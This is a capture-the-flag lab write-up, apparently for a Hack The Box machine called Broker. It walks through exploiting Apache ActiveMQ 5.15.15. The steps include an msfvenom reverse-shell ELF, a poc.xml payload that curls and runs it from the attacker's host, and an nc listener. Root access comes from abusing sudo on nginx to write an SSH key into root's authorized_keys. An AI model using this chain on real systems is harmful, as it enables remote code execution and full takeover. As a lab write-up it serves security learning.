---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Reconnaissance
### Nmap scan
- Let's begin by running a simple `nmap` scan against the target machine.
```
$ nmap -p- 10.10.11.243 -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-10 18:26 IST
Nmap scan report for 10.10.11.243
Host is up (0.13s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
1337/tcp  open  waste
1883/tcp  open  mqtt
5672/tcp  open  amqp
7777/tcp  open  cbt
8161/tcp  open  patrol-snmp
43935/tcp open  unknown
61613/tcp open  unknown
61614/tcp open  unknown
61616/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 734.50 seconds
```
- We can now run an in-depth scan on only the ports that are open.
```
$ nmap -p 22,80,443,1337,1883,5672,7777,8161,43935,61613,61614,61616 -A 10.10.11.243   
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-10 18:57 IST
Nmap scan report for 10.10.11.243
Host is up (0.14s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
443/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 403 Forbidden
1337/tcp  open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE    TIME               FILENAME
| -       06-Nov-2023 01:10  bin/
| -       06-Nov-2023 01:10  bin/X11/
| 963     17-Feb-2020 14:11  bin/NF
| 129576  27-Oct-2023 11:38  bin/VGAuthService
| 51632   07-Feb-2022 16:03  bin/%5B
| 35344   19-Oct-2022 14:52  bin/aa-enabled
| 35344   19-Oct-2022 14:52  bin/aa-exec
| 31248   19-Oct-2022 14:52  bin/aa-features-abi
| 14478   04-May-2023 11:14  bin/add-apt-repository
| 14712   21-Feb-2022 01:49  bin/addpart
|_
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/MasterBroker: 
|_    ActiveMQ/Advisory/Consumer/Topic/#: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
7777/tcp  open  http       nginx 1.18.0 (Ubuntu)
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE    TIME               FILENAME
| -       06-Nov-2023 01:10  bin/
| -       06-Nov-2023 01:10  bin/X11/
| 963     17-Feb-2020 14:11  bin/NF
| 129576  27-Oct-2023 11:38  bin/VGAuthService
| 51632   07-Feb-2022 16:03  bin/%5B
| 35344   19-Oct-2022 14:52  bin/aa-enabled
| 35344   19-Oct-2022 14:52  bin/aa-exec
| 31248   19-Oct-2022 14:52  bin/aa-features-abi
| 14478   04-May-2023 11:14  bin/add-apt-repository
| 14712   21-Feb-2022 01:49  bin/addpart
|_
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Index of /
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
43935/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title.
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15

Nmap done: 1 IP address (1 host up) scanned in 46.18 seconds
```
- We can see that the ActiveMQ service is runnig on port `61616`.
- Let's visit the machine on port `61616` through our browser.

![2](https://github.com/Knign/Write-ups/assets/110326359/07fb3ab7-956d-40d7-9cb2-d4a7412181b0)

### CVE
- Let's check if this version has any vulnerabilities.

![3](https://github.com/Knign/Write-ups/assets/110326359/ac1ae3ec-675a-46d3-b0e2-946b77380900)

### Exploit
- Looking for exploits, we can find the following one:

![4](https://github.com/Knign/Write-ups/assets/110326359/52032efc-5f72-4945-a1fa-97f081fb9b5b)

&nbsp;

## Initial Access
- We can now generate a reverse shell ELF file using `msfvenom`.
```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.154 LPORT=9999 -f elf -o exploit.elf
```
- We have to modify the `poc.xml` file.
```xml title="poc.xml"
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>curl -s -o exploit.elf http://10.10.14.154:8001/exploit.elf; chmod +x ./exploit.elf; ./exploit.elf</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```
- Next we have to spin up a `python3` server on port 8001 and a `nc` listener on port 9999.
```
$ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...

$ nc -nlvp 9999
listening on [any] 9999 ...
```
- This allows the POC to access the `exploit.elf` file on our machine.
- Finally we have to run the `exploit.py` as follows:
```
$ python3 exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.14.154:8001/poc.xml
```
- After a few seconds we can see the GET requests on the `python3` server.
```
$ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.11.243 - - [10/Dec/2023 19:58:06] "GET /poc.xml HTTP/1.1" 200 -
10.10.11.243 - - [10/Dec/2023 19:58:07] "GET /poc.xml HTTP/1.1" 200 -
10.10.11.243 - - [10/Dec/2023 19:58:07] "GET /exploit.elf HTTP/1.1" 200 -
```
- Let's check out our `nc` listener.
```
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.154] from (UNKNOWN) [10.10.11.243] 43728

```
- We have our shell.
- We can stabilize it using the following commands:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CRTL+Z
stty raw -echo; fg
export TERM=xterm
```
- Let's check our `id`.
```
activemq@broker:/opt/apache-activemq-5.15.15/bin$ id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
```
### User flag
- We can now `cat` out the user flag.
```
activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat /home/activemq/user.txt
75589562fe900bf4de17fbaf4d55afb3
```

&nbsp;

## Privilege Escalation
- We can check out the binaries that the `activemq` user can run as `sudo` using the following command:
```
activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```
- Let's build a new `.conf` file for the NGINX server.
```nginx title="/tmp/privesc.conf"
user root;
worker_processes 4;
pid /tmp/nginx2.pid;
events {
	worker_connections 768;
}
http {
	server {
		listen 1337;
		root /;
		autoindex on;
		dav_methods PUT;
	}
}
```
- We can set a custom `nginx` configuration by specifying the file we created using the `-c` flag.
```
activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo nginx -c /tmp/privesc.conf
nginx: [emerg] bind() to 0.0.0.0:1337 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:1337 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:1337 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:1337 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:1337 failed (98: Unknown error)
nginx: [emerg] still could not bind()
activemq@broker:/opt/apache-activemq-5.15.15/bin$ ss -tlpn
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                         
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*                                   
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                   
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                   
LISTEN 0      511          0.0.0.0:1337       0.0.0.0:*                                   
LISTEN 0      511          0.0.0.0:1338       0.0.0.0:*                                   
LISTEN 0      511          0.0.0.0:443        0.0.0.0:*                                   
LISTEN 0      511          0.0.0.0:7777       0.0.0.0:*                                   
LISTEN 0      4096               *:5672             *:*    users:(("java",pid=947,fd=144))
LISTEN 0      4096               *:61613            *:*    users:(("java",pid=947,fd=145))
LISTEN 0      50                 *:37549            *:*    users:(("java",pid=947,fd=26)) 
LISTEN 0      50                 *:61614            *:*    users:(("java",pid=947,fd=148))
LISTEN 0      4096               *:61616            *:*    users:(("java",pid=947,fd=143))
LISTEN 0      128             [::]:22            [::]:*                                   
LISTEN 0      4096               *:1883             *:*    users:(("java",pid=947,fd=146))
LISTEN 0      50                 *:8161             *:*    users:(("java",pid=947,fd=154))
```
- Let's generate an SSH key on our attacker machine.
```
$ ssh-keygen -f broker
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in broker
Your public key has been saved in broker.pub
The key fingerprint is:
SHA256:PiOl25+r67hFgJmFpkwc/pTQmc7cMUdSWu4L6DfOa20 kunal@kali
The key's randomart image is:
+---[RSA 3072]----+
| .oo +oo+        |
| .o.**o=.        |
| o.**.o+.        |
|  oo+..o         |
|    o . S        |
|   .   * .       |
|    . =.*        |
|     +.BEo .     |
|     .B==++.     |
+----[SHA256]-----+
```
- We can now upload this key to the target machine using the following command:
```
$ curl 10.10.11.243:1337/root/.ssh/authorized_keys --upload-file broker
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<html>
<head><title>405 Not Allowed</title></head>
<body>
<center><h1>405 Not Allowed</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
  6  2756  100   166    0     0    553      0 --:--:-- --:--:-- --:--:--   594
```
- Now we are all set to login as the `root` user, 
```
$ ssh -i broker root@10.10.11.243
The authenticity of host '10.10.11.243 (10.10.11.243)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.243' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Dec 20 05:07:41 PM UTC 2023

  System load:           0.0390625
  Usage of /:            76.2% of 4.63GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             215
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.243
  IPv6 address for eth0: dead:beef::250:56ff:feb9:2be6


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Dec 20 05:46:42 2023 from 10.10.14.38
root@broker:~# 
```
### Root flag
- Let's get the root flag.
```
root@broker:~# cat /root/root.txt
5a0ddd1174678ff246d93285c421e95f
```
